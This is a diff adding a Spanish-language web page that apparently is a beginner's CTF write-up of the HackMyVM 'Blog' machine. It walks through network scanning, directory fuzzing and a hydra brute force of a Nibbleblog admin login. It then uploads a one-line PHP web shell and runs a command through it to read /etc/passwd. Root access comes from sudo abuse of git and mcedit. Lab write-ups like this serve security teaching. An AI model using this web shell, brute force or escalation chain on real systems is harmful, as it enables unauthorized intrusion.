@@ -1,0 +1,655 @@
+<!DOCTYPE HTML>
+<html lang="es">
+
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0" />
+    <meta http-equiv="cache-control" content="no-cache"/>
+    <link rel="profile" href="https://gmpg.org/xfn/11" />
+    <meta name="robots" content="index,follow" />
+    <meta name="description" contant="" />
+    <meta name="keywords" content=""/>
+    <!-- Twitter Card data -->
+    <meta name="twitter:card" value="summary">
+    <!-- Open Graph data -->
+    <meta property="og:title" content="Guí/WriteUps Máquina Blog CTF" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://drenet.com/" />
+    <meta property="og:image" content="https://raw.githubusercontent.com/ShellDredd/ShellDredd.github.io/gh-pages/images/logo-ninja.JPG" />
+    <meta property="og:description" content="Resolución completa y explicada sobre la resoluciónd e la máquina Blog, desgranando paso a paso las técnicas y metodologías necesarias para vulnerar servicios y sistema." />
+    <meta name="robots" content="index,follow">
+	
+    <link  rel="icon" href="https://raw.githubusercontent.com/ShellDredd/ShellDredd.github.io/gh-pages/images/logo-ninja.JPG" type="image/jpeg" sizes="16x16" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:ital,wght@0,400;1,500&display=swap" rel="stylesheet">
+    <link href="css/color-blog.css" rel="stylesheet">
+
+    <title>ShellDredd Purple Parpers</title>
+
+</head>
+
+<body>
+
+</head>
+
+<body>
+
+  <nav class="dropdownmenu">
+  
+    <ul>
+      
+      <li><a><img class="logo-header-icon" src="https://cdn-icons-png.flaticon.com/512/336/336200.png"></a>
+      <ul id="submenu">
+        <li><a>MENÚ</a></li>
+        <li><a href="#">·Blog</a></li>
+        <li><a href="#">·Podcast</a></li>
+        <li><a href="https://www.twitch.tv/shelldredd" target="_blank">·Directos</a></li>
+        <li><a href="https://www.youtube.com/channel/UCV_nyB99w6s3tNTSK6aRI9Q" target="_blank">·Vídeos</a></li>
+        <li><a href="https://discord.gg/qUemGhF6hF">·Discord</a></li>
+      </ul>
+    </li>
+      
+    <li><a><a><img class="logo-header-icon" src="https://cdn-icons-png.flaticon.com/512/7069/7069820.png"></a>
+      <ul id="submenu">
+        <li><a>SUBMENÚ</a></li>
+        <li><a href="#">·Seguridad</a></li>
+        <li><a href="#">·WriteUps</a></li>
+        <li><a href="#">·Sistemas</a></li>
+        <li><a href="#">·Redes</a></li>
+        <li><a href="#">·Programación</a></li>
+        <li><a href="#">·Herramientas</a></li>
+        <li><a href="#">PRÓXIMAMENTE MÁS</a></li>
+      </ul>
+    </li>
+  
+    <li><a><a><img class="logo-header-icon" src="https://cdn-icons-png.flaticon.com/512/808/808439.png"></a>
+      <ul id="submenu">
+        <li><a href="#">ACTIVIDADES</a></li>
+        <li><a href="#">·Máquinas CTF</a></li>
+        <li><a href="https://shelldredd.github.io/23/" target="blamk">·Retos Web</a></li>
+        <li><a href="#">·Torneos</a></li>
+      </ul>
+    </li>
+  
+    <li><a><a><img class="icon-shelldredd" src="https://shelldredd.github.io/images/logo-text-shelldredd.jpeg"></a></li>
+    </ul>
+    </ul>
+    </nav>
+
+    <main class="main">
+        <br><br><br><br>
+
+        <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+            <table>
+              <tr class="cabecera-tabla-tips">
+                <th class="name-creator"><span><h5><b><img src="https://media2.giphy.com/media/hM3hev4edKz6oCZzyD/giphy.gif?cid=ecf05e477gp4ikqz50l2ndmlmt40btdt9dd0e7hsxgvvt4ec&rid=giphy.gif&ct=s" width="40" height="25">Guía explicativa resolución de máquina CTF.  | Blog - d4t4s3c</b></h5></span></th>
+              </tr>
+              <tr>
+                <td><span class="text-descrip-table-tips">
+                  <b><br>
+                    Lo que a continuación encontrarás es un writup(guía técnica) de la resolución de una máquina CTF (capture the flag) que no 
+                    es más que un sistema con servicios creado y estructurado con ciertas vulnerabilidades conocidas, que se han implementado en la misma 
+                    de una forma lógica que permita el aprendizaje en los niveles fáciles y consiga ser todo en reto en niveles difíciles.<br><br>
+                    Un writeup suele albergar unicamente la parte técnica a modo de reporte, facilitando la guía de pasos y técnicas utilizadas 
+                    para resolver la máquina CTF o laboratorio vulnerable, pero en este caso he decidido hacer una explicación de cada paso realizado, 
+                    con la intención de que aporte todos los puntos necesarios para que un usuari@ que nunca ha jugado con CTF's y pueda entender todo el 
+                    proceso que conlleva todo lo anteriormente comentado.
+                  </b><br><br>
+                </span>
+                </td>
+               </tr>
+              <tr>
+            </table>
+
+        <!--
+        <div class="portada-articulo-hmv"></div>
+        -->
+
+
+        <div class="bloque-texto">
+
+          <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+            <table>
+              <tr class="cabecera-tabla-tips">
+                <th class="name-creator"><span><h5><b><img src="https://media2.giphy.com/media/hM3hev4edKz6oCZzyD/giphy.gif?cid=ecf05e477gp4ikqz50l2ndmlmt40btdt9dd0e7hsxgvvt4ec&rid=giphy.gif&ct=s" width="40" height="25">Metadatos de la máquina Blog CTF.</b></h5></span></th>
+              </tr>
+              <tr>
+                <td><span class="text-descrip-table-tips">
+                  <b><br>
+                    Máquina CTF: Blog<br>
+                    <br><br>
+                    Creador: d4t4s3c<br>
+                  </b><br><br>
+                </span>
+                </td>
+               </tr>
+              <tr>
+            </table>
+        
+          <h2 class="h2-articulos"><img src="https://media2.giphy.com/media/5warsMsqwpDiH2ugEG/giphy.gif?cid=ecf05e47y966ao6u608z43xjq0w7om0zfc98ckxcdkzrnk83&rid=giphy.gif&ct=s" width="30px">Gestionar el entorno y las máquinas.
+          </h2><br>
+
+            <p class="texto-parrafo">
+                Una vez virtualizada la máquina víctima "Blog" y el sistema atacante preferido con el software de virtualización VirtualBox, iniciamos la comprobación del entorno con un escaneo de dispositivos conectados en 
+                red local y acotando por las siglas "PCS" dado que es la denominación de dispositivos en red que utiliza VirtualBox.
+               </p><br>
+
+              <h2 class="h2-articulos"><img src="https://media2.giphy.com/media/5warsMsqwpDiH2ugEG/giphy.gif?cid=ecf05e47y966ao6u608z43xjq0w7om0zfc98ckxcdkzrnk83&rid=giphy.gif&ct=s" width="30px">Gestionar el entorno y las máquinas.</h2><br>
+              <p class="texto-parrafo">
+                Una vez virtualizada la máquina víctima "Blog" y el sistema atacante preferido con el software de virtualización VirtualBox, iniciamos la comprobación del entorno con un escaneo de dispositivos conectados en red local y 
+                acotando por las siglas "PCS" dado que es la denominación de dispositivos en red que utiliza VirtualBox.<br><br>
+ 
+                <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                  <table>
+                    <tr class="cabecera-tabla-tips">
+                      <th class="name-creator"><span><h5><b><img src="https://media2.giphy.com/media/hM3hev4edKz6oCZzyD/giphy.gif?cid=ecf05e477gp4ikqz50l2ndmlmt40btdt9dd0e7hsxgvvt4ec&rid=giphy.gif&ct=s" width="40" height="25">Comandos / Documentos</b></h5></span></th>
+                    </tr>
+                    <tr>
+                      <td><span class="text-descrip-table-tips">
+                        <b><br>
+                          · arp-scan -l | grep "PCS" | awk {'print $1'}<br>
+                          <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-arp-scan.png">
+                          <br><br>
+                          · arp-scan -l | grep "PCS" | awk {'print $1'} > datitos<br>
+                          <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-arp-scan2.png">
+                        </b><br><br>
+                      </span>
+                      </td>
+                     </tr>
+                    <tr>
+                  </table>
+                <p class="texto-parrafo">
+                Si deseamos guardar esta información en un archivo de texto, podemos utilizar una redirección del STDOUT de la orden 
+                del sistema hacia un archivo de texto, usando la sintaxis y caracter ">" el cual, crea o sobreescribre el contenido 
+                de un archivo de texto. Si utilizamos dos ">>", en vez de sobreescribir sobre el contenido del archivo, lo que 
+                sucederá es que escribirá la información en la última línea disponible, añadiendo un salto de línea a la anterior.
+                <br>Ahora disponemos de IP correspondiente a la máquina víctima, preparamos una variable en sistema que guarde 
+                la misma, de forma que no necesitaremos posteriormente copiar y pegar.
+              </p><br><br>
+              </p>
+
+              <h2 class="h2-articulos"><img src="https://media2.giphy.com/media/5warsMsqwpDiH2ugEG/giphy.gif?cid=ecf05e47y966ao6u608z43xjq0w7om0zfc98ckxcdkzrnk83&rid=giphy.gif&ct=s" width="30px">Enumeración de servicios y puertos.
+              </h2><br>  
+
+              <p class="texto-parrafo">
+                Para comprobar si realmente existe una salida hacia la red por parte de la máquina víctima (trazabilidad ICMP), 
+                ejecutamos un ping que además nos ofrecerá alguna información extra, como el TTL (denominación correspondiente 
+                al sistema operativo).<br></p>
+                <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                  <table>
+                    <tr class="cabecera-tabla-tips">
+                      <th class="name-creator"><span><h5><b><img src="https://media2.giphy.com/media/hM3hev4edKz6oCZzyD/giphy.gif?cid=ecf05e477gp4ikqz50l2ndmlmt40btdt9dd0e7hsxgvvt4ec&rid=giphy.gif&ct=s" width="40" height="25">Comandos / Documentos</b></h5></span></th>
+                    </tr>
+                    <tr>
+                      <td><span class="text-descrip-table-tips">
+                        <b><br>
+                          · ping -c 1 $ip<br>
+                          <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-ping.png">
+                          
+                        </b><br><br>
+                      </span>
+                      </td>
+                     </tr>
+                    <tr>
+                  </table>
+
+                  <p class="texto-parrafo">
+                  Obtenemos un TTL de 64 por lo que estamos ante un sistema Gnu/Linux, con esta información podemos continuar con 
+                  un escaneo de servicios y puertos hacia la IP de la máquina víctima. Personalmente me gusta utilizar una metodología 
+                  de escaneo doble, primero un sondeo rápido de puertos abiertos para luego realizar un análisis más amplio a los 
+                  puertos abiertos descubiertos con la parametrización del primer nmap que ejecuto, esto es práctico ya que, ahorramos 
+                  tiempo de escaneo con la herramienta nmap, debido a que el segundo nmap es más agresivo y con parametrización que 
+                  extrae más información que el anterior y si lo lanzamos hacia todos los puertos, deriba en más tiempo.
+                  Para tener la información bien documentada en nuestro directorio predefinido de la máquina, guardaremos el STDOUT 
+                  del segundo nmap en un archivo de texto, para ello utilizaremos el parámetro "-oN" que guarda la salida en formato 
+                  nmap hacia un archivo de texto.<br>
+                  </p>
+               
+                  <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                    <table>
+                      <tr class="cabecera-tabla-tips">
+                        <th class="name-creator"><span><h5><b><img src="https://media2.giphy.com/media/hM3hev4edKz6oCZzyD/giphy.gif?cid=ecf05e477gp4ikqz50l2ndmlmt40btdt9dd0e7hsxgvvt4ec&rid=giphy.gif&ct=s" width="40" height="25">Comandos / Documentos</b></h5></span></th>
+                      </tr>
+                      <tr>
+                        <td><span class="text-descrip-table-tips">
+                          <b><br>
+                            · nmap -sS -n -Pn -p- --min-rate=6500 $ip --open
+                            <br>
+                            <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-nmap1.png">
+                            <br><br>
+                            · nmap -sCV -p22,80 $ip -oN nmap-scan
+                            <br>
+                            <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-nmap2.png">
+                          </b><br><br>
+                        </span>
+                        </td>
+                       </tr>
+                      <tr>
+                    </table>
+
+                    <h2 class="h2-articulos"><img src="https://media2.giphy.com/media/5warsMsqwpDiH2ugEG/giphy.gif?cid=ecf05e47y966ao6u608z43xjq0w7om0zfc98ckxcdkzrnk83&rid=giphy.gif&ct=s" width="30px">Enumeración servicio Web.
+                    </h2><br> 
+
+                    <p class="texto-parrafo">
+                      Dos servicios corriendo en puertos, aplicación de red SSH por el 22 y servicio web por el 80 sostentado por apache, 
+                      además obtenemos que el sistema es un debian. Un curl como método rápido de visualización del contenido web dependiente 
+                      de la IP.<br><br>
+                      Nos indica que existe un "pre" indicando un ping y un dominio "blog.hmv", se podría deducir que necesitamos añadir este 
+                      a nuestro /etc/host , pero en este caso no es necesario así que continuamos con un fuzzing de estexiones y directorios 
+                      web dependientes de IP, en este caso usamos la herramienta Wfuzz.
+                    </p>
+
+                    <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                      <table>
+                        <tr class="cabecera-tabla-tips">
+                          <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Comandos / Documentos</b></h5></span></th>
+                        </tr>
+                        <tr>
+                          <td><span class="text-descrip-table-tips">
+                            <b><br>
+                              · curl -s $ip
+                              <br><br>
+                              · wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $ip/FUZZ
+                              <br>
+                              <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-fuzzing1.png">
+                            </b><br><br>
+                          </span>
+                          </td>
+                         </tr>
+                        <tr>
+                      </table>
+
+                      <p class="texto-parrafo">
+                        Observamos que existe un directorio o extensión llamado "my_weblog" con una respuesta de 301.<br><br>
+                        Después de investigar en el código y en los enlaces, descubrimos un "meta name="generator" content="Nibleblog"" 
+                        que hace referencia a un gestor de contenidos web conocido, Nibleblog. Esta es una pista llamativa pero aún así 
+                        continuamos enumerando con el fuzzing, pero esta vez desde /my_weblog. Tampoco devuelve dirctorios, por lo que 
+                        añadimos extensiones, las que necesitamos son txt y php, las asignamos como parametrización al wfuzz. 
+                        Efectivamente esta enumeración nos revela 5 extensión, dos archivos txt y 3 php, COPYRIGHT.txt alberga 
+                        información del CMS Nibleblog y su fecha de copyright (2009 - 2013), deducimos tras una búsqueda en google, 
+                        que tenemos dos versiones en este periodo de tiempo. Tenemos un posible vector de ataque.
+                      </p>
+                      <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                        <table>
+                          <tr class="cabecera-tabla-tips">
+                            <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Comandos / Documentos</b></h5></span></th>
+                          </tr>
+                          <tr>
+                            <td><span class="text-descrip-table-tips">
+                              <b><br>
+                                · wfuzz -c --hc=404 -t 300 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,php-txt 'http://192.168.1.53/my_weblog/FUZZ.FUZ2Z'
+                                <br><br>
+                                <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-codigo1.png">
+                                <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-fuzzing2-extensiones.png">
+                                <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-copyright1.png">
+                              </b><br><br>
+                            </span>
+                            </td>
+                           </tr>
+                          <tr>
+                        </table>
+
+                        <h2 class="h2-articulos"><img src="https://media2.giphy.com/media/5warsMsqwpDiH2ugEG/giphy.gif?cid=ecf05e47y966ao6u608z43xjq0w7om0zfc98ckxcdkzrnk83&rid=giphy.gif&ct=s" width="30">Explotación CMS Nibleblog.
+                        </h2><br> 
+
+                        <p class="texto-parrafo">
+                          Buscamos exploits para el CMS y su versión, existe uno que utiliza la subida de un archivo para gestionar una reverse shell 
+                          con PHP pero se requiere autentificación, por lo que no nos sirve. El siguiente paso es realizar fuerza bruta al login 
+                          con la esperanza de obtener credenciales, para este proceso utilizamos hydra pero nos falta un detalle importante, 
+                          conocer el formato de las peticiones que hace el login desde el panel admin.php. Descubrimos un post con la sintáxis 
+                          de error, de la cual hacemos acopio para nuestra fuerza bruta (se observa desde el inspector de código, en la pestaña 
+                          de Network, hacemos un login aleatorio, click en el "document" de la petición y seleccionamos la pestaña "request").
+                        </p>
+                        <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                          <table>
+                            <tr class="cabecera-tabla-tips">
+                              <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Comandos / Documentos</b></h5></span></th>
+                            </tr>
+                            <tr>
+                              <td><span class="text-descrip-table-tips">
+                                <b><br>
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-codigo1.png"><br><br>
+                                  # Fuerza bruta con hydra:<br><br>
+                                  · hydra -t 50 -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form '/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect'
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-fuzzing2-extensiones.png">
+                                </b><br><br>
+                              </span>
+                              </td>
+                             </tr>
+                            <tr>
+                          </table>
+                        <p class="texto-parrafo">
+                          Hemos tenido suerte con las credenciales, accedemos como administrador al panel de gestión del CMS Nibbleblog y observando 
+                          los exploits comentados anteriormente, el vector de ataque para acceder al sistema se basa en la subida de una "imagen" 
+                          a través del apartado de plugins, pero nosotr@s usaremos un archivo con extensión "php" que contendrá una sintáxis del 
+                          lenguaje que nos permite provocar un RCE (ejecución de comandos remotamente) y de la cual haremos uso para extraer 
+                          información delicada del sistema y además, gestionar una reverse shell que nos dará acceso al sistema como usuario 
+                          www-data. (Este fallo es común en algunos CMS, la funcionalidad de subida de imagenes NO restringe formatos de archivo 
+                          diferentes a los correspondientes para imágenes).
+                        </p>
+                        <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                          <table>
+                            <tr class="cabecera-tabla-tips">
+                              <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Comandos / Documentos</b></h5></span></th>
+                            </tr>
+                            <tr>
+                              <td><span class="text-descrip-table-tips">
+                                <b><br>
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-panel1.png">
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-panel2.png">
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-panel-imagen1.png"><br><br><br>
+                                  # Generamos un archivo con extensión php que contenga la siguiente sintáxis y lo subimos al CMS:<br><br>
+                                  · ?php system($_GET['cmd']); ?>
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-php1.png">
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-panel-subida1.png">
+                                </b><br><br>
+                              </span>
+                              </td>
+                             </tr>
+                            <tr>
+                          </table>
+                          <p class="texto-parrafo">
+                            Ahora la pregunta clave, ¿donde diablos está alojada mi "imagen falsa"?. Bueno tendremos que investigar en google para 
+                            descubrir la ruta de visionado de imagenes correspondiente al CMS Nibbleblog, utilizando el siguiente dork: "content 
+                            image nibbleblog", google es tan amable de ofrecernos la solución en el primer enlace.<br>
+                            Nos revela que el directorio para visualizar las imágenes subidas es el siguiente:<br><br>
+                            /my_weblog/content/private/plugins/my_image/<br><br>
+                            Añadimos nuestra imagen maliciosa con extensión php "/my_image/image.php" y comprobamos que da acceso y código de 
+                            respuesta 200. El siguiente paso es añadir la sintáxis de ejecución de órdenes de sistema correspondiente al RCE en php.
+                             Podemos enumerar cierta información desde aquí, como los usuarios del /etc/passwd.
+                          </p>
+                          <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                            <table>
+                              <tr class="cabecera-tabla-tips">
+                                <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Comandos / Documentos</b></h5></span></th>
+                              </tr>
+                              <tr>
+                                <td><span class="text-descrip-table-tips">
+                                  <b><br>
+                                    · /my_weblog/content/private/plugins/my_image/image.php?cmd=id;hostname;cat /etc/passwd
+                                    <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-rce1.png">
+                                    <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-rce2.png">
+                                  </b><br><br>
+                                </span>
+                                </td>
+                               </tr>
+                              <tr>
+                            </table>
+                            <p class="texto-parrafo">
+                              Llegados a este punto, necesitamos una reverse shell para ejecutar desde el RCE obtenido, para ello utilizaremos la 
+                              herramienta "Shelly" del usuario d4t4s3c y que podemos descargar desde su espacio en github. Una vez instalada en 
+                              nuestro sistema, le otorgamos permisos de ejecución con "chmod +x" y seguimos los pasos para generar una reverseshell
+                               con netcat. Este paso se puede hacer manual, cuando repites este método varias veces, recuerdas perfectamente la 
+                               sintáxis pero a veces fallan y necesitas recurrir a sintáxis de otros lenguajes y aquí, es donde este tipo de 
+                               herramientas te facilitan el trabajo. Enlace a la herramienta <a href="https://github.com/d4t4s3c/Shelly">Shelly</a>
+                            </p>
+
+                            <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                              <table>
+                                <tr class="cabecera-tabla-tips">
+                                  <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Instalación y uso herramienta Shelly</b></h5></span></th>
+                                </tr>
+                                <tr>
+                                  <td><span class="text-descrip-table-tips">
+                                    <b><br> 
+                                      <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-reverse-data1.png">
+                                      <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-reverse-data2.png">
+                                    </b><br><br>
+                                  </span>
+                                  </td>
+                                 </tr>
+                                <tr>
+                              </table>
+                              <p class="texto-parrafo">
+                                Desde nuestra máquina atacante entablamos una escucha con netcat para poder recibir la shell inversa que 
+                                generamos en la web. Es importante asegurarse si el puerto que estamos usando no está ocupado por un servicio, 
+                                ya que esto provocaría que la escucha no surja ningun efecto a pesar de que todo esté bien gestionado. 
+                                Primero ejecutamos la escucha y después iniciamos la petición desde el RCE en la web.
+                              </p>
+                              <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                                <table>
+                                  <tr class="cabecera-tabla-tips">
+                                    <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Comandos / Documentos</b></h5></span></th>
+                                  </tr>
+                                  <tr>
+                                    <td><span class="text-descrip-table-tips">
+                                      <b><br> 
+                                        <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-enviar-shell.png">
+                                        <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-netcat1.png">
+                                      </b><br><br>
+                                    </span>
+                                    </td>
+                                   </tr>
+                                  <tr>
+                                </table>
+                    <h2 class="h2-articulos"><img src="https://media2.giphy.com/media/5warsMsqwpDiH2ugEG/giphy.gif?cid=ecf05e47y966ao6u608z43xjq0w7om0zfc98ckxcdkzrnk83&rid=giphy.gif&ct=s" width="30px">Enumeración y explotación de sistema.
+                    </h2><br>
+                    <p class="texto-parrafo">
+                      Ya tenemos acceso al sistema como usuario www-data y comenzamos con las metodologías de enumeración en sistema pero 
+                      antes, hacemos un tratamiento de TTY para tener comodidad y funcionalidades en la shell. Este es un ejemplo de 
+                      tratamiento de tty con bash:
+                    </p>
+                    <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                      <table>
+                        <tr class="cabecera-tabla-tips">
+                          <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Comandos / Documentos</b></h5></span></th>
+                        </tr>
+                        <tr>
+                          <td><span class="text-descrip-table-tips">
+                            <b><br>
+                              # En el sistema víctima:<br><br>
+                              $ script /dev/null -c bash<br>
+                              $ [ctrl+z]<br><br>
+
+# Nos envía a la shell de nuestro equipo atacante y ejecutamos:<br><br>
+
+$ stty raw -echo;fg<br>
+$ [ENTER]<br>
+$ reset<br>
+$ xterm<br><br>
+
+# Regresamos a la shell de la máquina víctima:<br><br>
+
+$ export TERM=xterm<br>
+$ export SHELL=bash<br>
+$ reset<br>
+$ xterm<br><br>
+
+# Ahora nos falta acomodar las clumnas y filas de la shell, nos dirigimos a la terminal de sistema atacante para ver que medidas tenemos y escribimos para ello:
+<br><br>
+$ stty -a<br><br>
+
+# Nos quedamos con las medidas y volvemos a la shell de la máquina víctima para añadir estas filas y columnas:<br><br>
+
+$ stty rows 42 columns 187
+                            </b><br><br>
+                          </span>
+                          </td>
+                         </tr>
+                        <tr>
+                      </table>
+                
+                      <p class="texto-parrafo">
+                        Existen varios métodos para enumerar, uno de ellos es el comando "sudo -l" que nos devuelve información de los permisos 
+                        que tenemos con sudo para ejecutar binarios o comandos sin contraseña bajo el manto de otro usuario del sistema. 
+                        Efectivamente, en este caso es así, podemos ejecutar /usr/bin/git como usuario "admin" sin passwd.
+                      </p>
+
+                      <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                        <table>
+                          <tr class="cabecera-tabla-tips">
+                            <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Comandos / Documentos</b></h5></span></th>
+                          </tr>
+                          <tr>
+                            <td><span class="text-descrip-table-tips">
+                              <b><br> 
+                                <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-git1.png">
+                                <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-git2.png">
+                                <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-admin1.png">
+                              </b><br><br>
+                            </span>
+                            </td>
+                           </tr>
+                          <tr>
+                        </table>
+
+                        <p class="texto-parrafo">
+                          Después conseguir pivotar hacia el usuario admin, volvemos con las metodologías de enumeración en sistema y al igual 
+                          que con el usuario data, con "sudo -l" observamos que tenemos permisos de ejecución de binario como root sin passwd 
+                          para /usr/bin/mcedit . Buscando información acerca de "mcedit" encontramos una forma de conseguir una shell dentro 
+                          del interfaz del propio programa.
+                        </p>
+                        <div class="cont-table-tips"> <!-- Tabla de contenidos -->
+                          <table>
+                            <tr class="cabecera-tabla-tips">
+                              <th class="name-creator"><span><h5><b><img src="https://media0.giphy.com/media/0lfqHNZwWM1hOvJ9CX/200w.webp?cid=ecf05e47viid1glx0xylnven0vjlhjxtc3mpmj3wjqpwckk1&rid=200w.webp&ct=s" width="60" height="40">Estos son los pasos:</b></h5></span></th>
+                            </tr>
+                            <tr>
+                              <td><span class="text-descrip-table-tips">
+                                <b><br>
+                                  · sudo -u root /usr/bin/mcedit<br>
+                                  · F9<br><br>
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-mcedit1.png"><br><br>
+                                  · Desde el botón de FILE, seleccionamos User Menu.
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-mcedit2.png"><br><br>
+                                  · Dentro del menu de usuario, seleccionamos la opción de "invoke shell".
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-mcedit3.png"><br><br>
+                                  !Ya somos usuario administrador en el sistema!
+                                  <img class="portada-caja-nueva" src="https://shelldredd.github.io/blogvm/blog-root.png">
+                                </b><br><br>
+                              </span>
+                              </td>
+                             </tr>
+                            <tr>
+                          </table>
+                          <p class="texto-parrafo">
+                            Antes de finalizar este writeup, me gustaría dar las gracias a HackMyVm por la gran comunidad y contenido de aprendizaje de alto nivel que ofrece de forma gratuita. También quiero agradecer al usuario d4t4s3c su labor y contribuciones, es un placer estudiar y aprender rodeado de usuari@s como él.
+                          </p>
+
+                        <br><br>
+                        <p class="texto-parrafo">
+                          ✪ Artículo escrito por ShellDredd.<br>
+                        </p><br><br>
+
+                        <h2 class="h2-articulos"><img src="https://media2.giphy.com/media/5warsMsqwpDiH2ugEG/giphy.gif?cid=ecf05e47y966ao6u608z43xjq0w7om0zfc98ckxcdkzrnk83&rid=giphy.gif&ct=s" width="30px">Nos vemos en el próximo artículo.
+                        </h2>
+                      
+             </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="cont-table"> <!-- Tabla de contenidos -->
+  <table>
+    <tr class="cabecera-tabla">
+      <th class="name-machine"><span></span><h5><b>Actividad</b></h5></span></th>
+      <th class="name-creator"><span><h5><b>Descripción</b></h5></span></th>
+      <th class="name-difficulty"><span><h5><b>Temática</b></h5></span></th>
+    </tr>
+    <tr>
+      <td><span class="text-article-table">
+          <b><a class="button" href="https://shelldredd.github.io/seguridad/hackmyvm.html"><img src="https://cdn-icons-png.flaticon.com/512/4793/4793069.png" width="40" height="30"></a>
+          <br><a class="a-article" href="https://shelldredd.github.io/seguridad/hackmyvm.html">Resolución Máquina Blog CTF</a></b></span></td>
+      <td><span class="text-descrip-table"><a class="button" href="https://shelldredd.github.io/seguridad/hackmyvm.html"><img src="https://cdn-icons-png.flaticon.com/512/2821/2821739.png" width="25" height="20"></a>
+          <b>07/01/2023 | Guía completa y explicada paso a paso sobre la resolución de la máquina BLOG, creada por d4t4s3c y de nivel fácil, la cual he elegido como favorita para este writeup destinado a jugadores/as novicios/as.</b></span>
+      </td>
